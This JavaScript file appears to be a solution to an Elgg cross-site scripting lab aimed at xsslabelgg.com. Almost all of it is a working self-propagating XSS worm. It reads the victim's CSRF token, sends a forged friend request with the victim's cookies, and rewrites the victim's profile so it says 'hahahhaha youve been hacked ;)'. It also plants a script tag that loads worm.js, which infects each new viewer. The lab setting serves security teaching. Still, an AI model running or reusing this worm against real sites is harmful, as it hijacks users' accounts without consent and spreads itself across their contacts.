	var Ajax_add_friend = null;

	// Construct the header information for the HTTP request


	//elgg.security.token

	//var username = document.getElementById('profile-details').innerHTML;


	//http://www.xsslabelgg.com/action/friends/add?friend=42&__elgg_ts=1510944206&__elgg_token=c677011e39dcf772bea2516ccd85ad41
	
	var url_request ="http://www.xsslabelgg.com/action/friends/add?friend=42&__elgg_token="+elgg.security.token.__elgg_token+"&__elgg_ts="+elgg.security.token.__elgg_ts;		

	Ajax_add_friend = new XMLHttpRequest();
	Ajax_add_friend.open("GET",url_request,true);
	Ajax_add_friend.setRequestHeader("Host","www.xsslabelgg.com");
	Ajax_add_friend.setRequestHeader("Keep-Alive","300");
	Ajax_add_friend.setRequestHeader("Connection","keep-alive");
	Ajax_add_friend.setRequestHeader("Cookie",document.cookie);
	Ajax_add_friend.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	Ajax_add_friend.send();

	Ajax=new XMLHttpRequest();
	Ajax.open("POST","http://www.xsslabelgg.com/action/profile/edit",true);
	Ajax.setRequestHeader("Host","www.xsslabelgg.com");
	Ajax.setRequestHeader("Keep-Alive","300");
	Ajax.setRequestHeader("Connection","keep-alive");
	Ajax.setRequestHeader("Cookie",document.cookie);
	Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");

	// Construct the content. The format of the content can be learned
	// from LiveHTTPHeaders.

	//http://www.xsslabelgg.com/action/friends/add?friend=42&__elgg_ts=1510944206&__elgg_token=c677011e39dcf772bea2516ccd85ad41

	//var content="name=..&description=...&guid="; // You need to fill in the details.

//Self Propagating worm
	var content="__elgg_token="+elgg.security.token.__elgg_token+
	"&__elgg_ts="+elgg.security.token.__elgg_ts+
	"&name="+elgg.session.user.name+
	"&briefdescription="+"hahahhaha youve been hacked ;)"+
	"&accesslevel[briefdescription]=2"+	
	"&guid="+elgg.session.user.guid +
  "&description=" + " <script type='text/javascript'src='http://www.xsslabelgg.com/worm.js'></script>";
	// Send the HTTP POST request.

	Ajax.send(content);

